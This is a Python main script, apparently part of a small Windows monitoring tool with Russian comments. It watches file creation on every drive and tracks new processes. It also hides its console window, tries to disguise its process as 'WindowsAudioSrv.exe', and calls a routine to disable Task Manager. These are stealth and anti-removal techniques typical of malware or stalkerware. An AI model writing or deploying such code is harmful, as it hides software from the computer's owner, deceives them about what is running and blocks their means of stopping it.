# main.py
import os
import string
import threading
import time
import ctypes
import psutil
from watchdog.observers import Observer
import config
import monitor
import alert

def hide_process():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
        current_process = psutil.Process(os.getpid())
        current_process.name("WindowsAudioSrv.exe")
    except Exception:
        pass

if __name__ == "__main__":
    hide_process()
    alert.disable_task_manager()

    # Запоминаем запущенные процессы, чтобы не было ложных срабатываний
    try:
        monitor.known_pids = {p.info['pid'] for p in psutil.process_iter(['pid'])}
    except Exception:
        monitor.known_pids = set()

    # 1. Запускаем слежку за файлами
    observer = Observer()
    handler = monitor.FastCreateHandler()
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            try:
                observer.schedule(handler, drive, recursive=True)
            except Exception:
                pass
    observer.start()

    # 2. Запускаем слежку за процессами
    threading.Thread(target=monitor.check_running_processes, daemon=True).start()

    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        observer.stop()
        observer.join()